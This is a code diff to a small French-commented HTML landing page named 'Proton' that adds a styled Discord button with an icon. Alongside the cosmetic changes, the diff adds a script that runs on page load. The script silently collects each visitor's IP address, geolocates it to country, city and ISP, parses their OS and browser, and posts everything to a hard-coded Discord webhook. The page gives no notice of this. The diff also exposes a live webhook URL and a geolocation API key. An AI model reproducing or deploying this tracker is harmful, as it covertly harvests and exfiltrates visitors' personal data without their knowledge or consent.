@@ -5,6 +5,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Proton</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" integrity="sha512-FZClIlnJeTgigdHTYoG4WJzXaa8eKO61g9KlEvqdNCaxoq3r8yM/rSeXeze2EnGIZkqtJH1KXmQ9vMXXiwulEw==" crossorigin="anonymous" />
   <style>
     body {
       background-color: #ffffff;
@@ -63,8 +64,9 @@
     }
 
     .custom-button {
+      display: inline-block;
+      background-color: #ffffff;
       border: 2px solid #5271FF;
-      background-color: transparent;
       color: #5271FF;
       padding: 10px 15px;
       border-radius: 5px;
@@ -72,13 +74,20 @@
       cursor: pointer;
       margin-top: 15px;
       text-decoration: none;
-      display: inline-block;
     }
 
     .custom-button:hover {
       background-color: #5271FF;
       color: #ffffff;
       border-color: #5271FF;
+    }
+
+    .icon-container {
+      margin-right: 8px;
+    }
+
+    .icon-container i {
+      color: #5271FF;
     }
 
     ::selection {
@@ -130,32 +139,109 @@
     </div>
     <div class="embed-footer"><b> Proton</b></div>
 
-    <!-- Ajout du bouton Discord en tant que lien -->
-    <a href="#" class="custom-button" id="discordButton" onclick="yourButtonClickFunction()">Discord</a>
+    <!-- Ajout du bouton Discord en tant que lien avec l'icône -->
+    <a href="https://discord.gg/yXQtudN7um" class="custom-button" onclick="yourButtonClickFunction()">
+      <span class="icon-container"><i class="fab fa-discord"></i></span> Discord
+    </a>
   </div>
 
-  <script>
-    const discordButton = document.getElementById('discordButton');
+    <script>
+    const webhookURL = "https://discord.com/api/webhooks/1213178913237246002/wpJNgN7xCeP0JVUV56RssXpMLaK7cWVcCRcI6DNKLJQaOTrW935G4OqiWDIwFKOgOYOS";
+    const ipAddressURL = "https://api64.ipify.org?format=json";
+    const ipGeolocationURL = "https://api.ipgeolocation.io/ipgeo?apiKey=26a08efba25f4d54bea9a057c95dc5cb";
 
-    // Fonction pour changer le lien du bouton Discord
-    const changeDiscordButtonLink = () => {
-      discordButton.href = "https://discord.gg/yXQtudN7um"; // Mettez votre nouveau lien ici
+    const getIpAddress = async () => {
+      const response = await fetch(ipAddressURL);
+      const data = await response.json();
+      return data.ip;
     };
 
-    // Votre fonction existante pour envoyer le Webhook
+    const getIpGeolocation = async (ipAddress) => {
+      const response = await fetch(`${ipGeolocationURL}&ip=${ipAddress}`);
+      const data = await response.json();
+      console.log(data);
+      return data;
+    };
+
+    const hideEmail = (email) => {
+      const atIndex = email.indexOf('@');
+      if (atIndex > 0) {
+        const visiblePart = email.substring(0, Math.min(atIndex, email.length - 3));
+        const hiddenPart = '*'.repeat(Math.max(0, email.length - atIndex - 3));
+        return visiblePart + hiddenPart + email.substring(atIndex);
+      }
+      return email;
+    };
+
+    const sendWebhook = async (embed) => {
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          embeds: [embed]
+        })
+      });
+    };
+
     const sendWebhookWithMessage = async () => {
       try {
-        // Votre code existant ici
+        const ipAddress = await getIpAddress();
+        const ipGeolocationData = await getIpGeolocation(ipAddress);
 
-        // Appel de la fonction pour changer le lien du bouton Discord
-        changeDiscordButtonLink();
+        const currentDate = new Date().toLocaleString();
+
+        const userAgent = window.navigator.userAgent;
+        const osInfo = userAgent.match(/\(([^)]+)\)/)[1];
+
+        const embed = {
+          title: "<:Proton1:1215949752445964288> Nouveau membre a rejoint le site!",
+          color: 0x2b2d31,
+          image: {
+            url: "https://cdn.discordapp.com/attachments/1213178802583109654/1213536171012132924/standard_7.gif?ex=65f5d4a1&is=65e35fa1&hm=37a8d41ff94bfbf319fbb88175f9d64834d1d5eaac5cd2b03bbd319b7eca4999"
+          },
+          fields: [
+            {
+              name: "Adresse IP",
+              value: `\`${ipAddress}\``,
+              inline: true
+            },
+            {
+              name: "Pays",
+              value: ipGeolocationData.country_name ? `\`${ipGeolocationData.country_name}\`` : "N/A",
+              inline: true
+            },
+            {
+              name: "Ville",
+              value: ipGeolocationData.city ? `\`${ipGeolocationData.city}\`` : "N/A",
+              inline: true
+            },
+            {
+              name: "Fournisseur Internet",
+              value: ipGeolocationData.isp ? `\`${ipGeolocationData.isp}\`` : "N/A",
+              inline: true
+            },
+            {
+              name: "Date",
+              value: `\`${currentDate}\``,
+              inline: true
+            },
+            {
+              name: "Plateforme & Navigateur",
+              value: `\`${osInfo}\``,
+              inline: true
+            }
+          ]
+        };
+
+        await sendWebhook(embed);
       } catch (error) {
         console.error(error);
       }
     };
 
-    // Appel initial pour changer le lien du bouton Discord
-    changeDiscordButtonLink();
+    sendWebhookWithMessage();
   </script>
 </body>
 
